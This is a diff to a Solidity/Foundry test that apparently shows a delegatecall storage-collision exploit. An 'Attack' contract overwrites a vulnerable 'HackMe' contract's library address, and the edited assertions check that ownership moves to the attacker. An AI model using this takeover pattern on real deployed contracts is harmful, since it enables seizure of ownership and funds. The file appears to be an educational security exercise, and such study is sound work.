@@ -19,7 +19,7 @@ contract Attack {
     }
 
     function attack() public {
-        // override address of lib
+//         override address of lib
         hackMe.doSomething(uint(uint160(address(this))));
         // pass any number as input, the function doSomething() below will
         // be called
@@ -47,10 +47,10 @@ contract HackMe2Test is Test {
     }
 
     function test_steal_owner_2() public {
-        assertEq(lib.someNumber(), 0);
+        assertEq(hackMe.owner(), signer);
         vm.startPrank(exploiter);
         Attack attack = new Attack(hackMe);
         attack.attack();
-        assertEq(lib.someNumber(), 1); // Don't know why it is not exploiter
+        assertEq(hackMe.owner(), address(attack));
     }
 }
